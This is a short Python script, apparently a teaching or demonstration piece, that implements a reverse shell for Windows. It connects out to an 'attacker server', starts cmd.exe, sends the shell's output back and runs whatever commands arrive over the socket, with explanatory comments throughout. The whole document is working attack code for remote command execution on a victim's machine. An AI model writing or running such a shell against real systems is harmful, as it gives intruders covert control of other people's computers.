import os
import time
from subprocess import Popen, PIPE
from socket import *

# Connect to attacker server to recieve commands
server = socket(AF_INET, SOCK_STREAM)
server.connect(('localhost', 64001))

# Run command prompt / terminal program in background
cmd = Popen(['cmd.exe'],  stdin=PIPE, stdout=PIPE, stderr=PIPE)

try:
  # Run forever until connection with server is closed
  while True:

    # Delay waits for command prompt to finish executing command
    time.sleep(0.5)

    # Send any output/response to attacker
    output = os.read(cmd.stdout.fileno(), 2048)
    server.send(output)

    # Run the command sent by the attacker
    command = server.recv(2048)
  
    if command != '\n':
      os.write(cmd.stdin.fileno(), command)

except ConnectionError:
  print('Terminating reverse shell!')

finally:
  # Cleanup resources
  cmd.terminate()
  server.close()
